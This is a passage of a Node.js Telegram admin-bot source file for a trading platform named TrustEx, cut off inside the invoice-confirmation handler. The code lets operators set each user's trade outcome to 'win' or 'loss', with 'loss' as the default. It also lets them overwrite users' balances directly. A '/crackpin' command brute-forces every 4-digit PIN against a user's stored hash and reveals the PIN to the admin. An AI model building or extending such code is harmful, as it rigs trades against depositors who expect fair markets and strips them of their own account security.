/**
 * Admin Bot - User Management
 * Поддерживает polling (dev) и webhooks (production)
 */

const TelegramBot = require('node-telegram-bot-api');
const pool = require('./config/database');
const { processReferralBonus } = require('./utils/referralBonus');

const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const MAIN_ADMIN_ID = (process.env.ADMIN_IDS || '').split(',')[0]?.trim();
const WEB_APP_URL = process.env.WEB_APP_URL || 'https://trustex-trade.onrender.com';

let bot = null;
let isProduction = false;

// Check if user is main admin
function isMainAdmin(userId) {
  return String(userId) === MAIN_ADMIN_ID;
}

// Check if user is sub-admin (async)
async function isSubAdmin(userId) {
  try {
    const result = await pool.query(
      'SELECT id FROM sub_admins WHERE telegram_id = $1',
      [String(userId)]
    );
    return result.rows.length > 0;
  } catch (e) {
    return false;
  }
}

// Check if user is manager (async)
async function isManager(userId) {
  try {
    const result = await pool.query(
      'SELECT id FROM managers WHERE telegram_id = $1',
      [String(userId)]
    );
    return result.rows.length > 0;
  } catch (e) {
    return false;
  }
}

// Check if user has admin access (main admin, sub-admin, or manager)
async function hasAdminAccess(userId) {
  if (isMainAdmin(userId)) return true;
  if (await isSubAdmin(userId)) return true;
  return await isManager(userId);
}

function formatNum(n) {
  return parseFloat(n || 0).toFixed(2);
}

function initAdminBot() {
  if (!ADMIN_BOT_TOKEN) {
    console.log('⚠️ ADMIN_BOT_TOKEN not set, admin bot disabled');
    return;
  }
  
  if (!MAIN_ADMIN_ID) {
    console.log('⚠️ ADMIN_IDS not set, admin bot disabled');
    return;
  }

  isProduction = process.env.NODE_ENV === 'production' || process.env.RENDER;
  const useWebhook = isProduction && WEB_APP_URL.startsWith('https://');

  if (useWebhook) {
    // Production + HTTPS: webhook режим
    bot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: false });
    console.log('🤖 Admin bot initialized (webhook mode)');
    setupAdminWebhook();
  } else {
    // Development: polling режим
    bot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });
    console.log('🤖 Admin bot started (polling mode)');
  }

  // Регистрируем обработчики
  registerAdminHandlers();

  // Устанавливаем кнопку меню через прямой API-вызов (надёжнее чем через библиотеку)
  // /admin route serves admin.html with strict no-cache headers
  const ADMIN_APP_URL = `${WEB_APP_URL}/admin`;
  const https = require('https');
  const menuData = JSON.stringify({
    menu_button: {
      type: 'web_app',
      text: 'Админка',
      web_app: { url: ADMIN_APP_URL }
    }
  });
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${ADMIN_BOT_TOKEN}/setChatMenuButton`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, (res) => {
    let body = '';
    res.on('data', d => body += d);
    res.on('end', () => {
      try {
        const r = JSON.parse(body);
      } catch(e) {}
    });
  });
  req.on('error', () => {});
  req.write(menuData);
  req.end();

  // Also reset per-chat override for main admin
  if (MAIN_ADMIN_ID) {
    const perChatData = JSON.stringify({
      chat_id: MAIN_ADMIN_ID,
      menu_button: {
        type: 'web_app',
        text: 'Админка',
        web_app: { url: ADMIN_APP_URL }
      }
    });
    const req2 = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${ADMIN_BOT_TOKEN}/setChatMenuButton`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {});
    });
    req2.on('error', () => {});
    req2.write(perChatData);
    req2.end();
  }
}

async function setupAdminWebhook() {
  if (!bot || !isProduction || !WEB_APP_URL.startsWith('https://')) return;

  const webhookPath = `/adminbot${ADMIN_BOT_TOKEN}`;
  const fullWebhookUrl = `${WEB_APP_URL}${webhookPath}`;

  try {
    await bot.deleteWebHook();
    await bot.setWebHook(fullWebhookUrl);
    console.log(`✅ Admin webhook set: ${WEB_APP_URL}/adminbot***`);
  } catch (error) {
    console.error('❌ Failed to set admin webhook:', error.message);
  }
}

function processAdminUpdate(update) {
  if (bot) {
    bot.processUpdate(update);
  }
}

function getAdminWebhookPath() {
  if (!ADMIN_BOT_TOKEN) return null;
  return `/adminbot${ADMIN_BOT_TOKEN}`;
}

function registerAdminHandlers() {
  if (!bot) return;

  const ADMIN_APP_URL = `${WEB_APP_URL}/admin`;

  // Start command
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!(await hasAdminAccess(msg.from.id))) {
      return bot.sendMessage(chatId, '⛔ Доступ запрещён');
    }
    
    bot.sendMessage(chatId, 
      '👑 *Админ-панель TrustEx*\n\n' +
      'Нажмите кнопку ниже, чтобы открыть панель управления.\n\n' +
      '📝 *Текстовые команды:*\n' +
      '`/users` — Список пользователей\n' +
      '`/user [id]` — Информация о пользователе\n' +
      '`/setbalance [id] [сумма]` — Установить баланс USDT\n' +
      '`/setbalancerub [id] [сумма]` — Установить баланс RUB\n' +
      '`/setbalancebyn [id] [сумма]` — Установить баланс BYN\n' +
      '`/setmode [id] [win/loss]` — Установить режим\n' +
      '`/crackpin [id]` — Восстановить PIN\n' +
      '`/stats` — Общая статистика',
      { 
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '👑 Открыть админ-панель',
                web_app: { url: ADMIN_APP_URL }
              }
            ]
          ]
        }
      }
    );
  });

  // List all users
  bot.onText(/\/users/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!(await hasAdminAccess(msg.from.id))) {
      return bot.sendMessage(chatId, '⛔ Доступ запрещён');
    }
    
    try {
      const result = await pool.query(`
        SELECT id, telegram_id, username, first_name, balance_usdt, balance_rub, COALESCE(trade_mode, 'loss') as trade_mode, created_at 
        FROM users 
        ORDER BY created_at DESC 
        LIMIT 50
      `);
      
      if (result.rows.length === 0) {
        return bot.sendMessage(chatId, '📭 Пользователей пока нет');
      }
      
      let text = '👥 *Пользователи:*\n\n';
      
      for (const user of result.rows) {
        const name = user.first_name || user.username || '🧪 Гость';
        const mode = user.trade_mode === 'win' ? '🟢' : '🔴';
        text += `${mode} *${name}*\n`;
        text += `   ID: \`${user.telegram_id}\`\n`;
        text += `   Баланс: ${formatNum(user.balance_usdt)} USDT | ${formatNum(user.balance_rub || 0)} ₽\n`;
        text += `   Режим: ${user.trade_mode}\n\n`;
      }
      
      bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      
    } catch (e) {
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка при получении пользователей');
    }
  });

  // Get user info
  bot.onText(/\/user (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!(await hasAdminAccess(msg.from.id))) {
      return bot.sendMessage(chatId, '⛔ Доступ запрещён');
    }
    
    const searchId = match[1].trim();
    
    try {
      const result = await pool.query(
        'SELECT * FROM users WHERE telegram_id = $1 OR id::text = $1',
        [searchId]
      );
      
      if (result.rows.length === 0) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
      }
      
      const user = result.rows[0];
      
      // Handle null trade_mode
      user.trade_mode = user.trade_mode || 'loss';
      
      // Get trade stats
      const statsResult = await pool.query(`
        SELECT 
          COUNT(*) as total,
          COUNT(*) FILTER (WHERE result = 'win') as wins,
          COUNT(*) FILTER (WHERE result = 'loss') as losses,
          COALESCE(SUM(CASE WHEN result = 'win' THEN profit ELSE -amount END), 0) as total_pnl
        FROM orders 
        WHERE user_id = $1 AND status = 'closed'
      `, [user.id]);
      
      const stats = statsResult.rows[0];
      
      // Get transactions
      const txResult = await pool.query(`
        SELECT 
          COUNT(*) FILTER (WHERE type = 'deposit') as deposits,
          COALESCE(SUM(amount) FILTER (WHERE type = 'deposit'), 0) as deposit_sum,
          COUNT(*) FILTER (WHERE type = 'withdrawal') as withdrawals,
          COALESCE(SUM(amount) FILTER (WHERE type = 'withdrawal'), 0) as withdrawal_sum
        FROM transactions 
        WHERE user_id = $1
      `, [user.id]);
      
      const tx = txResult.rows[0];
      
      const name = user.first_name || user.username || '🧪 Гость';
      const mode = user.trade_mode === 'win' ? '🟢 WIN' : '🔴 LOSS';
      const verifStatus = user.needs_verification 
        ? (user.verified ? '✅ Верифицирован' : '⚠️ Требуется верификация') 
        : '➖ Не требуется';
      
      const text = `👤 *${name}*\n\n` +
        `🆔 Telegram ID: \`${user.telegram_id}\`\n` +
        `📛 Username: @${user.username || 'нет'}\n` +
        `💰 Баланс: *${formatNum(user.balance_usdt)} USDT* | *${formatNum(user.balance_rub || 0)} ₽*\n`+
        `🎯 Режим: *${mode}*\n` +
        `🔐 Верификация: *${verifStatus}*\n` +
        `📅 Регистрация: ${new Date(user.created_at).toLocaleDateString('ru')}\n\n` +
        `📊 *Трейдинг:*\n` +
        `   Сделок: ${stats.total}\n` +
        `   Побед: ${stats.wins} | Поражений: ${stats.losses}\n` +
        `   P&L: ${formatNum(stats.total_pnl)} USDT\n\n` +
        `💳 *Транзакции:*\n` +
        `   Депозитов: ${tx.deposits} (${formatNum(tx.deposit_sum)} USDT)\n` +
        `   Выводов: ${tx.withdrawals} (${formatNum(tx.withdrawal_sum)} USDT)`;
      
      // Кнопка верификации
      const verifBtnText = user.needs_verification 
        ? (user.verified ? '❌ Снять верификацию' : '✅ Верифицировать')
        : '🔐 Требовать верификацию';
      const verifAction = user.needs_verification 
        ? (user.verified ? `unverify_${user.telegram_id}` : `verify_${user.telegram_id}`)
        : `needverif_${user.telegram_id}`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: '🟢 WIN', callback_data: `setmode_${user.telegram_id}_win` },
            { text: '🔴 LOSS', callback_data: `setmode_${user.telegram_id}_loss` }
          ],
          [
            { text: '💰 Изменить баланс', callback_data: `balance_${user.telegram_id}` }
          ],
          [
            { text: verifBtnText, callback_data: verifAction }
          ],
          [
            { text: user.is_blocked ? '✅ Разблокировать' : '⛔ Заблокировать', callback_data: `block_${user.telegram_id}` }
          ]
        ]
      };
      
      bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
      
    } catch (e) {
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка при получении данных');
    }
  });

  // Set balance command (with amount) - main admin only
  bot.onText(/\/setbalance (\S+) (\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const searchId = match[1].trim();
    const newBalance = parseFloat(match[2]);
    
    if (isNaN(newBalance) || newBalance < 0) {
      return bot.sendMessage(chatId, '❌ Неверная сумма');
    }
    
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const lockResult = await client.query(
        'SELECT id, first_name, username FROM users WHERE telegram_id = $1 FOR UPDATE',
        [searchId]
      );
      if (lockResult.rows.length === 0) {
        await client.query('ROLLBACK');
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
      }
      await client.query(
        'UPDATE users SET balance_usdt = $1, updated_at = NOW() WHERE telegram_id = $2',
        [newBalance, searchId]
      );
      await client.query('COMMIT');
      
      const name = lockResult.rows[0].first_name || lockResult.rows[0].username;
      bot.sendMessage(chatId, `✅ Баланс *${name}* установлен: *${formatNum(newBalance)} USDT*`, { parse_mode: 'Markdown' });
      
    } catch (e) {
      await client.query('ROLLBACK').catch(() => {});
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка');
    } finally {
      client.release();
    }
  });

  // Set balance command (without amount - show help) - main admin only
  bot.onText(/^\/setbalance (\S+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const telegramId = match[1].trim();
    bot.sendMessage(chatId, 
      `💰 Введите сумму:\n\n\`/setbalance ${telegramId} [сумма]\`\n\nПример: \`/setbalance ${telegramId} 1000\``,
      { parse_mode: 'Markdown' }
    );
  });

  // Set RUB balance command (with amount) - main admin only
  bot.onText(/\/setbalancerub (\S+) (\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const searchId = match[1].trim();
    const newBalance = parseFloat(match[2]);
    
    if (isNaN(newBalance) || newBalance < 0) {
      return bot.sendMessage(chatId, '❌ Неверная сумма');
    }
    
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const lockResult = await client.query(
        'SELECT id, first_name, username FROM users WHERE telegram_id = $1 FOR UPDATE',
        [searchId]
      );
      if (lockResult.rows.length === 0) {
        await client.query('ROLLBACK');
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
      }
      await client.query(
        'UPDATE users SET balance_rub = $1, updated_at = NOW() WHERE telegram_id = $2',
        [newBalance, searchId]
      );
      await client.query('COMMIT');
      
      const name = lockResult.rows[0].first_name || lockResult.rows[0].username;
      bot.sendMessage(chatId, `✅ Баланс RUB *${name}* установлен: *${formatNum(newBalance)} ₽*`, { parse_mode: 'Markdown' });
      
    } catch (e) {
      await client.query('ROLLBACK').catch(() => {});
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка');
    } finally {
      client.release();
    }
  });

  // Set RUB balance command (without amount - show help) - main admin only
  bot.onText(/^\/setbalancerub (\S+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const telegramId = match[1].trim();
    bot.sendMessage(chatId, 
      `💰 Введите сумму в рублях:\n\n\`/setbalancerub ${telegramId} [сумма]\`\n\nПример: \`/setbalancerub ${telegramId} 50000\``,
      { parse_mode: 'Markdown' }
    );
  });

  // Set BYN balance command (with amount) - main admin only
  bot.onText(/\/setbalancebyn (\S+) (\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const searchId = match[1].trim();
    const newBalance = parseFloat(match[2]);
    
    if (isNaN(newBalance) || newBalance < 0) {
      return bot.sendMessage(chatId, '❌ Неверная сумма');
    }
    
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const lockResult = await client.query(
        'SELECT id, first_name, username FROM users WHERE telegram_id = $1 FOR UPDATE',
        [searchId]
      );
      if (lockResult.rows.length === 0) {
        await client.query('ROLLBACK');
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
      }
      await client.query(
        'UPDATE users SET balance_byn = $1, updated_at = NOW() WHERE telegram_id = $2',
        [newBalance, searchId]
      );
      await client.query('COMMIT');
      
      const name = lockResult.rows[0].first_name || lockResult.rows[0].username;
      bot.sendMessage(chatId, `✅ Баланс BYN *${name}* установлен: *${formatNum(newBalance)} Br*`, { parse_mode: 'Markdown' });
      
    } catch (e) {
      await client.query('ROLLBACK').catch(() => {});
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка');
    } finally {
      client.release();
    }
  });

  // Set BYN balance command (without amount - show help) - main admin only
  bot.onText(/^\/setbalancebyn (\S+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const telegramId = match[1].trim();
    bot.sendMessage(chatId, 
      `💰 Введите сумму в BYN:\n\n\`/setbalancebyn ${telegramId} [сумма]\`\n\nПример: \`/setbalancebyn ${telegramId} 5000\``,
      { parse_mode: 'Markdown' }
    );
  });

  // Set mode command - main admin only
  bot.onText(/\/setmode (\S+) (win|loss)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const searchId = match[1].trim();
    const newMode = match[2];
    
    try {
      const result = await pool.query(
        'UPDATE users SET trade_mode = $1 WHERE telegram_id = $2 RETURNING first_name, username',
        [newMode, searchId]
      );
      
      if (result.rows.length === 0) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
      }
      
      const name = result.rows[0].first_name || result.rows[0].username;
      const modeText = newMode === 'win' ? '🟢 WIN' : '🔴 LOSS';
      bot.sendMessage(chatId, `✅ Режим *${name}* установлен: *${modeText}*`, { parse_mode: 'Markdown' });
      
    } catch (e) {
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка');
    }
  });

  // Crack PIN command - main admin only
  bot.onText(/\/crackpin (\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isMainAdmin(msg.from.id)) {
      return bot.sendMessage(chatId, '⛔ Только для главного админа');
    }
    
    const telegramId = match[1].trim();
    
    try {
      const result = await pool.query(
        'SELECT security_pin, first_name, username FROM users WHERE telegram_id = $1',
        [telegramId]
      );
      
      if (result.rows.length === 0) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
      }
      
      const user = result.rows[0];
      const storedHash = user.security_pin;
      const name = user.first_name || user.username || 'Гость';
      
      if (!storedHash) {
        return bot.sendMessage(chatId, `❌ У пользователя *${name}* не установлен PIN`, { parse_mode: 'Markdown' });
      }
      
      bot.sendMessage(chatId, `🔓 Восстанавливаю PIN для *${name}*...\nЭто займёт несколько секунд.`, { parse_mode: 'Markdown' });
      
      // Brute force 0000-9999 (async to avoid blocking event loop)
      const crypto = require('crypto');
      const { promisify } = require('util');
      const pbkdf2 = promisify(crypto.pbkdf2);
      const [salt, storedHashValue] = storedHash.split(':');
      
      let found = false;
      for (let i = 0; i <= 9999; i++) {
        const pin = i.toString().padStart(4, '0');
        const hashBuf = await pbkdf2(pin, salt, 10000, 64, 'sha512');
        const hash = hashBuf.toString('hex');
        
        if (hash === storedHashValue) {
          found = true;
          bot.sendMessage(chatId, 
            `✅ *PIN восстановлен!*\n\n` +
            `👤 Пользователь: *${name}*\n` +
            `🆔 ID: \`${telegramId}\`\n` +
            `🔑 PIN: \`${pin}\``, 
            { parse_mode: 'Markdown' }
          );
          break;
        }
      }
      
      if (!found) bot.sendMessage(chatId, '❌ Не удалось восстановить PIN');
      
    } catch (e) {
      console.error('Crackpin error:', e);
      bot.sendMessage(chatId, '❌ Ошибка: ' + e.message);
    }
  });

  // Overall stats
  bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!(await hasAdminAccess(msg.from.id))) {
      return bot.sendMessage(chatId, '⛔ Доступ запрещён');
    }
    
    try {
      const usersResult = await pool.query(`
        SELECT 
          COUNT(*) as total,
          COUNT(*) FILTER (WHERE trade_mode = 'win') as win_mode,
          COUNT(*) FILTER (WHERE COALESCE(trade_mode, 'loss') = 'loss') as loss_mode,
          COALESCE(SUM(balance_usdt), 0) as total_balance
        FROM users
      `);
      
      const tradesResult = await pool.query(`
        SELECT 
          COUNT(*) as total,
          COUNT(*) FILTER (WHERE result = 'win') as wins,
          COUNT(*) FILTER (WHERE result = 'loss') as losses
        FROM orders 
        WHERE status = 'closed'
      `);
      
      const txResult = await pool.query(`
        SELECT 
          COALESCE(SUM(amount) FILTER (WHERE type = 'deposit'), 0) as deposits,
          COALESCE(SUM(amount) FILTER (WHERE type = 'withdrawal'), 0) as withdrawals
        FROM transactions
      `);
      
      const users = usersResult.rows[0];
      const trades = tradesResult.rows[0];
      const tx = txResult.rows[0];
      
      const text = '📊 *Общая статистика*\n\n' +
        `👥 *Пользователи:* ${users.total}\n` +
        `   🟢 WIN режим: ${users.win_mode}\n` +
        `   🔴 LOSS режим: ${users.loss_mode}\n` +
        `   💰 Общий баланс: ${formatNum(users.total_balance)} USDT\n\n` +
        `📈 *Сделки:* ${trades.total}\n` +
        `   ✅ Прибыльных: ${trades.wins}\n` +
        `   ❌ Убыточных: ${trades.losses}\n\n` +
        `💳 *Транзакции:*\n` +
        `   📥 Депозиты: ${formatNum(tx.deposits)} USDT\n` +
        `   📤 Выводы: ${formatNum(tx.withdrawals)} USDT`;
      
      bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
      
    } catch (e) {
      console.error('Admin bot error:', e);
      bot.sendMessage(chatId, '❌ Ошибка');
    }
  });

  // Callback handlers
  bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (!(await hasAdminAccess(query.from.id))) {
      return bot.answerCallbackQuery(query.id, { text: '⛔ Доступ запрещён' });
    }
    
    // Set mode from inline button - main admin only
    if (data.startsWith('setmode_')) {
      if (!isMainAdmin(query.from.id)) {
        return bot.answerCallbackQuery(query.id, { text: '⛔ Только для главного админа' });
      }
      
      const [, telegramId, mode] = data.split('_');
      
      try {
        await pool.query(
          'UPDATE users SET trade_mode = $1 WHERE telegram_id = $2',
          [mode, telegramId]
        );
        
        const modeText = mode === 'win' ? '🟢 WIN' : '🔴 LOSS';
        bot.answerCallbackQuery(query.id, { text: `Режим установлен: ${modeText}` });
        
        // Refresh - send updated info
        const result = await pool.query('SELECT * FROM users WHERE telegram_id = $1', [telegramId]);
        if (result.rows.length > 0) {
          const user = result.rows[0];
          const name = user.first_name || user.username || '🧪 Гость';
          bot.sendMessage(chatId, `✅ Режим *${name}* изменён на *${modeText}*`, { parse_mode: 'Markdown' });
        }
        
      } catch (e) {
        console.error('Admin bot error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
      }
    }
    
    // Balance change prompt - main admin only
    if (data.startsWith('balance_')) {
      if (!isMainAdmin(query.from.id)) {
        return bot.answerCallbackQuery(query.id, { text: '⛔ Только для главного админа' });
      }
      
      const telegramId = data.split('_')[1];
      
      bot.answerCallbackQuery(query.id);
      bot.sendMessage(chatId, 
        `💰 Введите новый баланс:\n\n\`/setbalance ${telegramId} [сумма]\`\n\nПример: \`/setbalance ${telegramId} 1000\``,
        { parse_mode: 'Markdown' }
      );
    }
    
    // Block/Unblock user - request confirmation
    if (data.startsWith('block_') && !data.startsWith('block_confirm_')) {
      if (!isMainAdmin(query.from.id)) {
        return bot.answerCallbackQuery(query.id, { text: '⛔ Только для главного админа' });
      }
      
      const telegramId = data.split('_')[1];
      
      try {
        const result = await pool.query('SELECT first_name, username, is_blocked FROM users WHERE telegram_id = $1', [telegramId]);
        if (result.rows.length === 0) {
          return bot.answerCallbackQuery(query.id, { text: '❌ Пользователь не найден' });
        }
        
        const user = result.rows[0];
        const name = user.first_name || user.username || '🧪 Гость';
        const isBlocked = user.is_blocked;
        const action = isBlocked ? 'разблокировать' : 'заблокировать';
        
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, 
          `⚠️ *Подтверждение*\n\n` +
          `Вы уверены, что хотите ${action} пользователя *${name}*?\n\n` +
          `🆔 Telegram ID: \`${telegramId}\``,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: isBlocked ? '✅ Да, разблокировать' : '⛔ Да, заблокировать', callback_data: `block_confirm_${telegramId}_${isBlocked ? '0' : '1'}` },
                  { text: '❌ Отмена', callback_data: 'block_cancel' }
                ]
              ]
            }
          }
        );
      } catch (e) {
        console.error('Block user error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
      }
    }
    
    // Block/Unblock user - confirmed
    if (data.startsWith('block_confirm_')) {
      if (!isMainAdmin(query.from.id)) {
        return bot.answerCallbackQuery(query.id, { text: '⛔ Только для главного админа' });
      }
      
      const parts = data.replace('block_confirm_', '').split('_');
      const telegramId = parts[0];
      const setBlocked = parts[1] === '1';
      
      try {
        // Get user info
        const userResult = await pool.query('SELECT first_name, username FROM users WHERE telegram_id = $1', [telegramId]);
        
        if (userResult.rows.length === 0) {
          bot.answerCallbackQuery(query.id, { text: '❌ Пользователь не найден' });
          return;
        }
        
        const user = userResult.rows[0];
        const name = user.first_name || user.username || '🧪 Гость';
        
        // Update block status
        await pool.query('UPDATE users SET is_blocked = $1 WHERE telegram_id = $2', [setBlocked, telegramId]);
        
        // Notify user
        try {
          const { getBot } = require('./bot');
          const mainBot = getBot();
          if (mainBot) {
            if (setBlocked) {
              await mainBot.sendMessage(telegramId, 
                '⛔ Ваш аккаунт был заблокирован администратором.\n\n' +
                'Для получения информации обратитесь в поддержку.'
              );
            } else {
              await mainBot.sendMessage(telegramId, 
                '✅ Ваш аккаунт был разблокирован.\n\n' +
                'Добро пожаловать обратно!'
              );
            }
          }
        } catch (e) {
          console.log('Could not notify user:', e.message);
        }
        
        // Update message
        bot.editMessageText(
          `${setBlocked ? '⛔' : '✅'} *Пользователь ${setBlocked ? 'заблокирован' : 'разблокирован'}*\n\n` +
          `👤 ${name}\n` +
          `🆔 Telegram ID: \`${telegramId}\``,
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
          }
        );
        
        bot.answerCallbackQuery(query.id, { text: setBlocked ? '⛔ Заблокирован' : '✅ Разблокирован' });
        // notification failed
        
      } catch (e) {
        console.error('Block user error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка: ' + e.message });
      }
    }
    
    // Block cancelled
    if (data === 'block_cancel') {
      bot.answerCallbackQuery(query.id, { text: 'Отменено' });
      bot.deleteMessage(chatId, query.message.message_id);
    }
    
    // Require verification
    if (data.startsWith('needverif_')) {
      const telegramId = data.split('_')[1];
      
      try {
        await pool.query(
          'UPDATE users SET needs_verification = TRUE WHERE telegram_id = $1',
          [telegramId]
        );
        
        const result = await pool.query('SELECT first_name, username FROM users WHERE telegram_id = $1', [telegramId]);
        const name = result.rows[0]?.first_name || result.rows[0]?.username || '🧪 Гость';
        
        bot.answerCallbackQuery(query.id, { text: '🔐 Верификация включена' });
        bot.sendMessage(chatId, `🔐 Пользователю *${name}* теперь требуется верификация`, { parse_mode: 'Markdown' });
      } catch (e) {
        console.error('Needverif error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
      }
    }
    
    // Verify user
    if (data.startsWith('verify_')) {
      const telegramId = data.split('_')[1];
      
      try {
        await pool.query(
          'UPDATE users SET verified = TRUE WHERE telegram_id = $1',
          [telegramId]
        );
        
        const result = await pool.query('SELECT first_name, username FROM users WHERE telegram_id = $1', [telegramId]);
        const name = result.rows[0]?.first_name || result.rows[0]?.username || '🧪 Гость';
        
        bot.answerCallbackQuery(query.id, { text: '✅ Верифицирован' });
        bot.sendMessage(chatId, `✅ Пользователь *${name}* верифицирован`, { parse_mode: 'Markdown' });
      } catch (e) {
        console.error('Verify error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
      }
    }
    
    // Unverify user (remove verification requirement)
    if (data.startsWith('unverify_')) {
      const telegramId = data.split('_')[1];
      
      try {
        await pool.query(
          'UPDATE users SET verified = FALSE, needs_verification = FALSE WHERE telegram_id = $1',
          [telegramId]
        );
        
        const result = await pool.query('SELECT first_name, username FROM users WHERE telegram_id = $1', [telegramId]);
        const name = result.rows[0]?.first_name || result.rows[0]?.username || '🧪 Гость';
        
        bot.answerCallbackQuery(query.id, { text: '❌ Верификация снята' });
        bot.sendMessage(chatId, `❌ Верификация снята с *${name}*`, { parse_mode: 'Markdown' });
      } catch (e) {
        console.error('Unverify error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
      }
    }
    
    // Confirm invoice payment manually
    if (data.startsWith('confirm_invoice_')) {
      const invoiceId = data.replace('confirm_invoice_', '');
      const client = await pool.connect();
      
      try {
        await client.query('BEGIN');
        
        // Get invoice from database with lock to prevent double credit
        const invoiceResult = await client.query(
          'SELECT * FROM crypto_invoices WHERE invoice_id = $1 FOR UPDATE',
          [invoiceId]
        );
        
        if (invoiceResult.rows.length === 0) {
          await client.query('ROLLBACK');
          bot.answerCallbackQuery(query.id, { text: '❌ Инвойс не найден' });
          return;
        }
        
        const invoice = invoiceResult.rows[0];
        
        if (invoice.status === 'paid') {
          await client.query('ROLLBACK');
          bot.answerCallbackQuery(query.id, { text: '⚠️ Уже оплачен' });
          return;
        }
        
        const paidAmount = parseFloat(invoice.amount);
        
        // Determine what balance to credit
        const origCurrency = invoice.original_currency;
        const origAmount = invoice.original_amount ? parseFloat(invoice.original_amount) : null;
        
        // Deposit commission (1% for all users)
        let commission = 0;
        
        let balanceField, creditAmount, creditCurrency, displayAmount;
        
        if (origCurrency === 'RUB') {
          balanceField = 'balance_rub';
          creditAmount = origAmount;
          creditCurrency = 'RUB';
          displayAmount = `${origAmount} ₽`;
        } else if (origCurrency === 'EUR') {
          balanceField = 'balance_eur';
          creditAmount = origAmount;
          creditCurrency = 'EUR';
          displayAmount = `${origAmount} €`;
        } else if (origCurrency === 'BYN') {
          balanceField = 'balance_byn';
          creditAmount = origAmount;
          creditCurrency = 'BYN';
          displayAmount = `${origAmount} Br`;
        } else {
          balanceField = 'balance_usdt';
          creditAmount = paidAmount;
          creditCurrency = 'USDT';
          displayAmount = `${paidAmount} USDT`;
        }
        
        commission = parseFloat((creditAmount * 0.01).toFixed(2));
        creditAmount = parseFloat((creditAmount - commission).toFixed(2));
        
        // Update invoice status
        await client.query(
          'UPDATE crypto_invoices SET status = $1, paid_at = NOW() WHERE invoice_id = $2',
          ['paid', invoiceId]
        );
        
        // Credit user balance
        await client.query(
          `UPDATE users SET ${balanceField} = ${balanceField} + $1, updated_at = NOW() WHERE id = $2`,
          [creditAmount, invoice.user_id]
        );
        
        // Create transaction record
        let desc = `Пополнение (подтверждено админом): ${displayAmount}`;
        if (commission > 0) {
          const sym = creditCurrency === 'RUB' ? '₽' : creditCurrency === 'EUR' ? '€' : creditCurrency === 'BYN' ? 'Br' : 'USDT';
          desc += ` (комиссия 1%: ${commission.toFixed(2)} ${sym})`;
        }
        await client.query(
          `INSERT INTO transactions (user_id, amount, currency, type, description, created_at)
           VALUES ($1, $2, $3, 'deposit', $4, NOW())`,
          [invoice.user_id, creditAmount, creditCurrency, desc]
        );
        
        // Process referral bonus (20% of first deposit)
        await processReferralBonus(invoice.user_id, creditAmount, creditCurrency, client);

